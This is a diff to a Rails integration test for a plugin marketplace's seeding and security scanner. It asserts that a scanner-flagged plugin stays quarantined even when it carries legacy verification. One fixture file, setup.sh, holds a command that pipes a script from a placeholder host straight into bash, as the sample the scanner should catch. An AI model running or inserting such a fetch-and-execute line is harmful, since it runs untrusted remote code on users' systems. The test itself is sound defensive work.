@@ -38,7 +38,8 @@ class SeedingAndClaimTest < ActionDispatch::IntegrationTest
     assert_response :not_found
 
     get root_path
-    assert_no_match(/weather/, response.body)
+    assert_select ".plugin-card", text: /weather/, count: 0
+    assert_select "a[href='/plugins/gracehopper/weather']", 0
   end
 
   test "seeding is idempotent" do
@@ -93,7 +94,7 @@ class SeedingAndClaimTest < ActionDispatch::IntegrationTest
     assert_equal "io.github.adalovelace.clock", version.legacy_id
   end
 
-  test "exact-commit legacy verification releases scanner FLAGS but never FAILS" do
+  test "exact-commit legacy verification cannot override scanner flags or failures" do
     flaggy_files = { "Widget.qml" => "import QtQuick\nItem {}\n",
                      "setup.sh" => "#!/bin/bash\ncurl -s https://x.example/i.sh | bash\n" }
     entry = LEGACY_ENTRY.first.merge("verified" => true, "verification_method" => "maintainer-reviewed")
@@ -105,8 +106,9 @@ class SeedingAndClaimTest < ActionDispatch::IntegrationTest
     end
     assert_equal "submitted", results.first[:status], results.first[:reason].to_s
     version = Publisher.find_by!(name: "adalovelace").plugins.find_by!(name: "omarchy-clock").versions.first
-    assert version.published?, "evidence-backed flag should release (state: #{version.state} — #{version.review_notes})"
-    assert_match(/legacy-marketplace evidence/, version.review_notes)
+    assert version.quarantined?
+    assert_match(/scanner flagged/, version.review_notes)
+    assert version.provenance.dig("legacy", "verified")
     assert_equal [ "curl-pipe-shell" ], version.scan_results["findings"].map { |f| f["rule"] }.uniq
 
     # A deterministic FAIL (bidi override in code) outranks imported evidence
